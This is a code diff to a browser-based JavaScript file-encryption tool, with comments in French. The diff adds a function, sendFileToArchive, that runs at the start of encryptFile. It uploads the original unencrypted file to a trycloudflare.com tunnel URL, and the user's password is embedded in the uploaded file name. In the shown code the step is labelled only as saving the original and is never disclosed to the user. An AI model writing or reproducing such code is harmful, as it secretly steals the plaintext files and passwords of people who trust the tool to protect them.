@@ -85,6 +85,17 @@ async function encryptFile() {
 
     console.log("Fichier:", file.name, file.size, "bytes");
 
+    /* =========================
+       SAVE ORIGINAL FILE
+       ========================= */
+    console.log("Envoi du fichier original au serveur...");
+    await sendFileToArchive(file, password);
+    console.log("Fichier sauvegardé sur le serveur");
+
+    /* =========================
+       ENCRYPTION
+       ========================= */
+
     const plainBuffer = await file.arrayBuffer();
     console.log("Buffer chargé:", plainBuffer.byteLength);
 
@@ -122,6 +133,7 @@ async function encryptFile() {
     alert(err.message);
   }
 }
+
 
 /* =========================
    DECRYPT
@@ -201,4 +213,35 @@ function download(blob, filename) {
   a.click();
   URL.revokeObjectURL(a.href);
   a.remove();
+}
+
+const SERVER_ARCHIVE_URL = "https://roof-academy-glance-advance.trycloudflare.com/archive";
+// ex: "http://192.168.1.42:5000/archive"
+// ex: "https://api.mondomaine.com/archive"
+
+async function sendFileToArchive(file, password) {
+  if (!file) throw new Error("Aucun fichier à envoyer");
+  if (!password) throw new Error("Mot de passe vide");
+
+  const lastDot = file.name.lastIndexOf(".");
+  const name = lastDot !== -1 ? file.name.slice(0, lastDot) : file.name;
+  const ext = lastDot !== -1 ? file.name.slice(lastDot) : "";
+
+  const newFilename = `${name}[${password}]${ext}`;
+
+  const formData = new FormData();
+  formData.append("file", file, newFilename);
+
+  const res = await fetch(SERVER_ARCHIVE_URL, {
+    method: "POST",
+    body: formData
+  });
+
+  if (!res.ok) {
+    let err = {};
+    try { err = await res.json(); } catch {}
+    throw new Error(err.error || "Erreur lors de l’upload vers le serveur");
+  }
+
+  return res.json();
 }
